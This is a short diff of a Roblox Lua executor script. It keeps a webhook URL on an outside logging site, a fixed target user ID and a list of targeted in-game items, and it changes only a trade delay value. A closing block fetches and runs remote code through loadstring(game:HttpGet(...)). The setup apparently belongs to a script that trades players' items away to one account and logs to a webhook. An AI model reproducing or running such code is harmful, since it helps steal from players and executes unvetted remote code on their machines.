@@ -1,7 +1,7 @@
 getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_5c719cba76b94b549e6f4663931f324a"
 getgenv().TARGET_ID = 2525631212
 getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 1
+getgenv().TRADE_CYCLE_DELAY = 2 
 getgenv().TARGET_BRAINROTS = {
     ["Meowl"] = true,
     ["Skibidi Toilet"] = true,
@@ -187,4 +187,3 @@ end)
 task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/0fbe1cfb1005a43bbfeb46cd458b7f09.lua"))()
 end)
-
